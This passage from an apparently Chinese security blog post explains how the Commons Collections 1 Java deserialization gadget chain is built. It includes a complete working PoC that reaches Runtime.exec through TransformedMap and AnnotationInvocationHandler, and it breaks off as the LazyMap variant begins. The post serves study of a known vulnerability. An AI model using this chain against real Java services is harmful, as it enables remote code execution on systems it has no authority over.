class="line"><span class="number">3</span>.准备用gm去把invoke引出来</span><br><span class="line">Method i = gm.invoke(Class.forName(<span class="string">"java.lang.reflect.Method"</span>),<span class="string">"invoke"</span>)</span><br><span class="line"><span class="number">4</span>.组合到一起</span><br><span class="line">i.invoke("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br></pre></td></tr></table></figure><p>晕的可以往下看：</p><p>失败版构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),//先获取<span class="title">Runtime</span>实例</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">       <span class="comment">//还需要填充，调用getRuntime得到Runtime实例,第一个参数是获取的方法，这里先获取getMethod方法，第二个是参数列表，这个是getMethod方法的参数列表，第三个参数是invoke方法的参数列表，这里我们想拿到getRuntime方法，这部分在经过transform函数处理之后，返回的是getRuntime()这样的一个Method方法</span></span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">          <span class="comment">//最后一轮是先获取exec方法，invoke方法的命令是“open /Applications/Calculator.app”</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>InvokerTransformer的参数包括(方法名a，a的参数类型，invoke的参数{对象，对象参数})</p><p>我们认为可以，但实际上还是不行，原因：</p><p>在第二步出来之后，object是getRuntime，是method对象，<strong>一个Method对象是不能调用exec()的</strong></p><p>所以我们这里还需要<strong>invoke</strong>函数的参与</p><p>所以我们还需要再来一步得到invoke函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),//先获取<span class="title">Runtime</span>实例</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">       <span class="comment">//还需要填充，调用getRuntime得到Runtime实例,第一个参数是获取的方法，这里先获取getMethod方法，第二个是参数列表，这个是getMethod方法的参数列表，第三个参数是invoke方法的参数列表，这里我们想先反射出来getRuntime参数，这部分在经过transform函数处理之后，返回的是getRuntime()这样的一个方法。</span></span><br><span class="line">  new InvokerTransformer("invoke", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;null,new Object[]&#123;&#125;&#125;)</span><br><span class="line">          <span class="comment">//把invoke方法引出来，看好参数的类别，该占位占位</span></span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">          <span class="comment">//最后一轮是先获取exec方法，invoke方法的命令是“open /Applications/Calculator.app”</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里重点记录一下invoke环节的debug过程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input=getRuntime这个Method对象</span></span><br><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Method（getRuntime方法是Method类）</span></span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes); <span class="comment">//在method类中找到invoke方法，method=invoke方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs); <span class="comment">//调用invoke方法，input=getRuntime这个方法，传入自定义的参数</span></span><br></pre></td></tr></table></figure><p>最后一步其实就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke.invoke(getRuntime(),<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;);</span><br></pre></td></tr></table></figure><p>发现一个骚东西：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">invoke.invoke(a,&#123;b,c&#125;)</span><br><span class="line">  a.invoke(b,c)</span><br><span class="line">  b.a(c)</span><br></pre></td></tr></table></figure><p>套用在最后一句上：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">invoke.invoke(getRuntime(),<span class="keyword">null</span>);</span><br><span class="line">getRuntime().invoke(<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;)</span><br></pre></td></tr></table></figure><p>这里为什么null可以呢？</p><p>是因为getRuntime函数是static的，根本不需要obj来hold。</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513015209016.png" alt="image-20210513015209016" style="zoom:50%;"><p>所以这里这两种写法<strong>都可以</strong>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new InvokerTransformer("invoke", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;null,new Object[]&#123;&#125;&#125;)</span><br><span class="line">new InvokerTransformer("invoke", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;Class.forName("java.lang.Runtime"),new Object[]&#123;&#125;&#125;)</span><br></pre></td></tr></table></figure><p>多说一句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getRuntime().invoke(<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;)</span><br></pre></td></tr></table></figure><p>这句话相当于：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getRuntime() 后面都是寂寞</span><br><span class="line">getRuntime() =&gt; Runtime 实例</span><br></pre></td></tr></table></figure><p>既然能返回Runtime实例，目标达成。</p><p>第四步debug：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input=Runtime类实例</span></span><br><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Runtime </span></span><br><span class="line">Method method = cls.getMethod(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span>&#125;)</span>; <span class="comment">//在Runtime类中找到exec方法，method=exec方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="string">"open /Applications/Calculator.app"</span>); <span class="comment">//调用invoke方法</span></span><br></pre></td></tr></table></figure><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512161134367.png" alt="image-20210512161134367" style="zoom:80%;"><p>所以目前demo3.0:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChainedTransformer</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"><span class="comment">//触发</span></span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们最想要的是，transform方法最好也要自动触发，所以发现了checkSetValue方法，它会自动调用transform方法。</p><p>checkSetValue方法属于每一个继承了AbstractInputCheckedMapDecorator的类，TransformedMap算一个。</p><p>所以接下来我们的目标就变成了<strong>如何让TransformedMap自动调用transform方法</strong>。</p><p><strong>我们的ChainedTransformer说到底就是一个Transformer，只要添加数据至map中就会自动调用tramsform，就会执行转换链执行payload。</strong></p><p>这样我们就可以把触发条件从显性的调用<strong>转换链的transform函数</strong>延伸到<strong>修改map的值</strong>。<strong>很明显后者是一个常规操作，极有可能被触发。</strong></p><p>举个例子获得一个TransformedMap的实例，可以通过TransformedMap.decorate()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map tansformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure><p>可以看到三个参数，map，keyTransformer，valueTransformer。</p><p>查看org.apache.commons.collections.map.TransformedMap#decorate源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512170116032.png" alt="image-20210512170116032"></p><p>到这里，触发条件就是更改map的值(key或者value)即可。</p><h4 id="寻找readObject复写点"><a href="#寻找readObject复写点" class="headerlink" title="寻找readObject复写点"></a>寻找readObject复写点</h4><p>感觉还是奇怪，需要服务端配合将反序列化内容反序列化为map，并对值进行修改。</p><p>如果某个可序列化的类重写了<code>readObject()</code>方法，并且在<code>readObject()</code>中对Map类型的变量进行了key-value修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。</p><p>在1.7中存在一个完美的复写点：<strong>sun.reflect.annotation.AnnotationInvocationHandler</strong></p><p>关于AnnotationInvocationHandler类，这个类本身是被设计用来处理Java注解的。</p><p>看两处源码关键点：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512171701564.png" alt="image-20210512171701564"></p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512172608629.png" alt="image-20210512172608629" style="zoom:95%;"><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p><strong>为什么要传入Target.class?</strong></p><p>Target是Java提供的四个元注解之一(Target，Documented，Inherited)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type)</span><br></pre></td></tr></table></figure><p>我们回来看<code>AnnotationType.getInstance(this.type)</code>对@Target这个注解的处理。var2=getInstance会获取到@Target的基本信息，包括注解元素，注解元素的默认值，生命周期，是否继承等等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var3 = var2.memberTypes();</span><br></pre></td></tr></table></figure><p>var3就是var2的键值对类型，可以取值<code>Ljava.lang.annotation.ElementType</code>类型的值。</p><p>这里其实占了Java注解的语法糖的便宜，Java注解默认都是value = XXXX，相当于蹭了个谐音梗。</p><p><strong>为什么一定要Map(“value”, “value”)?</strong></p><p>因为在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map var3 = var2.memberTypes();<span class="comment">//var3 = &#123;value：ElementType&#125;</span></span><br></pre></td></tr></table></figure><p>这就保证了在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Map var3 = var2.memberTypes();<span class="comment">// var3 = &#123;value：ElementType&#125;</span></span><br><span class="line">Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator(); <span class="comment">// var4 是迭代器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">  Entry var5 = (Entry)var4.next();<span class="comment">//var5 = &#123;value:value&#125;</span></span><br><span class="line">  String var6 = (String)var5.getKey();<span class="comment">// var6 = value</span></span><br><span class="line">  Class var7 = (Class)var3.get(var6); <span class="comment">//ElementType</span></span><br><span class="line">  <span class="comment">//从@Target的注解元素键值对&#123;value：ElementType的键值对&#125;中去寻找键名为key的值</span></span><br><span class="line">  <span class="comment">//如果key的值不是value，那么这里就null，链就断掉了</span></span><br><span class="line">  <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">//触发命令执行处</span></span><br><span class="line">    var5.setValue...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>保证<code>innerMap.put(&quot;value&quot;,&quot;xxxxxx&quot;)</code>也是可以的，只要key的值为”value“就行。</strong></p><h4 id="su18师傅斧正"><a href="#su18师傅斧正" class="headerlink" title="su18师傅斧正"></a>su18师傅斧正</h4><p>su18师傅纠正我，其实这里并不一定是Target.class。。。</p><p>比如这里换成另一种注解：Generated.class</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210719193602502.png" alt="image-20210719193602502" style="zoom:50%;"><p>我们选最下面这个字段“comments”，那这个版本就是：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210719193907555.png" alt="image-20210719193907555" style="zoom:50%;"><p>debug跟一下：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210719194130981.png" alt="image-20210719194130981"></p><p>这里和之前一样，var3是map，var4是迭代器，我们的终极目标是执行<code>setValue</code></p><p>var5就是entry，var6就是key（String类型），var7就是var3中var6对应的value，是String.class这个类对象。</p><p>var8是entry中的value，如果我们要执行<code>setValue</code>，就必须让<code>var7.isInstance(var8)==false</code></p><p>也就是说：</p><p><strong>var8不能是String类型</strong>，所以这里HashMap的value不能再是“value”了，比如可以改成3，int类型就是可以的。</p><h4 id="最终版本PoC"><a href="#最终版本PoC" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><p>最终版本PoC构造如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1_TransformedMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChian</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>挖掘流程：</p><ol><li>找readObejct复写点，发现了TransformedMap实现了，进去看一看，留个心</li><li>阅读文档，发现TransformedMap机制是一旦该Map中的元素发生了变化，都会调用Transformer的transform方法</li><li>发现Transformer的transform就是个接口中的方法</li><li>依次查看Transformer的实现类，发现ChainedTransformer中的transform会成环调用自身Transformer数组中的Transformer</li><li>[支线任务开启]寻找invoke调用2点，发现InvokerTransformer内部的transform方法符合反射调用，有可控潜力</li><li>为了符合exp的构造条件，发现ConstantTransformer可以参与</li><li>将一句话分别由多个Transformer来hold，形成了ChainedTransformer，为了让ChainedTransformer.transform可以自动化调用，下一步需要去找哪里用了transform方法</li><li>查看transform的调用，发现TransformedMap类中有checkSetValue方法调用了transform方法</li><li>同时发现checkSetValue是抽象类AbstractInputCheckedMapDecorator的方法，同时该类内部静态类MapEntry的setValue方法调用了checkSetValue方法</li><li>实现AbstractInputCheckedMapDecorator的类有四个，TransformedMap算一个。所以TransformedMap1既是readObject复写点，又是执行链的起点(更改map中的值)[支线任务结束]</li><li>如何来自动更改值，还是去找readObejct复写点，发现AnnotationInvocationHandler十分合适，既复写了readObject，又修改了map的值，可以包装到最外面</li><li>编写Exp</li></ol><p><strong>Exp利用流程</strong>：</p><ol><li>AnnotationInvocationHandler#readObject函数会在反序列化中被执行，并且会触发TransformedMap$EntrySet的setValue赋值。</li><li>EntrySet的构造函数是Set和AbstractInputCheckedMapDecorator类型。</li><li>由于TransformedMap继承了AbstractInputCheckedMapDecorator类，也就继承了AbstractInputCheckedMapDecorator内部的setValue方法。</li><li>setValue就是AbstractInputCheckedMapDecorator.MapEntry#setValue，他的内部会调用checkSetValue方法。</li><li>这里面的map是TransformedMap，所以TransformedMap版本的checkSetValue会调用transform方法，这个transform会调用TransformedMap自身的ConstantTransformer数组，循环调用。这个ConstantTransformer是通过decorate函数将ConstantTransformer配置进去的，最终payload执行。</li></ol><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513192345876.png" alt="image-20210513192345876"></p><p>这里值得细细地跟一下，TransformedMap并不是Map</p><p>this.memberValues = [TransformedMap outMap] = (&lt;”value”,”value”&gt;，chain)</p><p>TransformedMap自己没有entrySet，所以会执行距离它最近的父类的entrySet方法。</p><p>也就是AbstractInputCheckedMapDecorator的entrySet方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513202149561.png" alt="image-20210513202149561"></p><p>这里map的值为HashMap&lt;”value”,”value”&gt;，this是本类对象 TransformedMap outMap</p><p>调用的是本类内部类EntrySet的构造函数</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513203152290.png" alt="image-20210513203152290"></p><p>所以这个Entry函数ruturn回去就是一个AbstractInputCheckedMapDecorator$EntrySet的对象，结构是(注意他们的类别)：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513205357509.png" alt="image-20210513205357509"></p><p>&lt;&lt;”value”,”value”&gt;,outMap&gt;就是var5</p><p>接下来会执行iterator方法，这个方法AbstractInputCheckedMapDecorator#EntrySet也做了实现：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513205526861.png" alt="image-20210513205526861"></p><p>可以看出，实现了对collection的迭代器和parent的操作</p><p>跟进去看EntrySetIterator的实现：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513205918283.png" alt="image-20210513205918283"></p><p>返回一个迭代器就是var4，是。</p><p>接下来，var5=var4.next()</p><p>跟进去next方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513210302272.png" alt="image-20210513210302272"></p><p>好家伙，直接返回了一个MapEntry,entry是entry，parent一直都是TransformedMap outMap</p><p>这下终于理清了，是cc直接搞得鬼。</p><p>var5就是AbstractInputCheckedMapDecorator$MapEntry类</p><p>接下来之后对var5进行setValue调用，由于var5是AbstractInputCheckedMapDecorator$MapEntry对象，所以会执行自己的setValue方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513210604593.png" alt="image-20210513210604593"></p><p>由于这里parent一直是TransformedMap对象outMap，所以调用的是TransformedMap的checkSetValue方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513210818971.png" alt="image-20210513210818971"></p><p>可以看到，这时候outMap一直帮我们存着的chain原来放在了valueTransformer的属性里，也就自然会被执行了。</p><p>接下来就是熟悉的情节了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513211012291.png" alt="image-20210513211012291"></p><p>触发。</p><h3 id="LazyMap版本"><a href="#LazyMap版本" class="headerlink" title="LazyMap版本"></a>LazyMap版本</h3><p>LazyMap也调用了transform方法。</p><h4 id="利用链寻找-1"><a href="#利用链寻找-1" class="headerlink" title="利用链寻找"></a>利用链寻找</h4><p>对Transformer接口中的transform方法find usage：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513111502143.png" alt="image-20210513111502143"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513111521568.png" alt="image-20210513111521568"></p><p>get方法首先判断map中是否已有该key，如果不存在，最终会到factory.transform进行处理。</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513111833377.png" alt="image-20210513111833377" style="zoom:80%;"><p>能发现decorate方法可以new一个LazyMap方法，如果factory可控，就很有搞头了。</p><p>接下来要找找哪些方法会调用LazyMap的get方法(最好是readObject内部会用到，最契合的条件，可惜没有)</p><p>坑点记录：<a href="https://0range228.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/" target="_blank" rel="noopener">记一次对线rt.jar</a></p><p>发现AnnotationInvocationHandler内部的invoke调用了get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513153931088.png" alt="image-20210513153931088"></p><p>我们可以发现在这个类中，memberValues是Map对象，并且有对map的get操作。</p><p>LazyMap也是Map的子类，重写了get方法，所以这里如果memberValues是LazyMap类对象，会成功调用LazyMap的get方法，就可以触发漏洞。</p><p>所以如何触发这个invoke函数呢？</p><h4 id="PoC构造"><a href="#PoC构造" class="headerlink" title="PoC构造"></a>PoC构造</h4><p>需要依赖动态代理，参考<a href="https://0range228.github.io/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/" target="_blank" rel="noopener">之前的博客</a>：</p><p><strong>总结就是被动态代理的对象调用任意方法都会调用对应的InvocationHandler的invoke方法。</strong></p><p>写个小例子好理解：</p><p><img 